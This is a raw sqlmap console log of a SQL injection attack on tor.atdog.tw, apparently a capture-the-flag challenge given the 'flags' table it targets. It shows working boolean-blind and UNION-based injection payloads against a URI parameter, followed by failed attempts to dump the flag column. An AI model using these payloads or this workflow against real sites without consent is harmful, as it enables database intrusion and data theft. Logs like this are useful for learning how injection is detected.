
    sqlmap/1.0-dev - automatic SQL injection and database takeover tool
    http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 20:19:12

[20:19:12] [WARNING] you've provided target URL without any GET parameters (e.g. www.site.com/article.php?id=1) and without providing any POST parameters through --data option
do you want to try URI injections in the target URL itself? [Y/n/q] [20:19:13] [INFO] resuming back-end DBMS 'mysql' 
[20:19:13] [INFO] testing connection to the target URL
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: URI
Parameter: #1*
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://tor.atdog.tw:80/news/1) AND 6575=6575 AND (8729=8729

    Type: UNION query
    Title: MySQL UNION query (NULL) - 5 columns
    Payload: http://tor.atdog.tw:80/news/1) UNION ALL SELECT NULL,CONCAT(0x7178657571,0x436c72625778424e6462,0x7175727971),NULL,NULL,NULL#
---
[20:19:18] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL 5
[20:19:18] [INFO] fetching columns 'flag' for table 'flags' in database 'tor_production'
you provided a HTTP Cookie header value. The target URL provided its own cookies within the HTTP Set-Cookie header which intersect with yours. Do you want to merge them in futher requests? [Y/n] [20:19:32] [WARNING] something went wrong with full UNION technique (most probably because of limitation on retrieved number of entries). Falling back to partial UNION technique
[20:19:36] [WARNING] the SQL query provided does not return any output
[20:19:36] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[20:19:36] [WARNING] unable to retrieve column names for table 'flags' in database 'tor_production'
[20:19:36] [INFO] fetching entries of column(s) 'flag' for table 'flags' in database 'tor_production'
[20:19:38] [WARNING] the SQL query provided does not return any output
[20:19:38] [INFO] fetching number of column(s) 'flag' entries for table 'flags' in database 'tor_production'
[20:19:38] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[20:19:38] [INFO] retrieved: 
[20:19:42] [WARNING] unable to retrieve the number of column(s) 'flag' entries for table 'flags' in database 'tor_production'
[20:19:42] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 7 times
[20:19:42] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/tor.atdog.tw'

[*] shutting down at 20:19:42

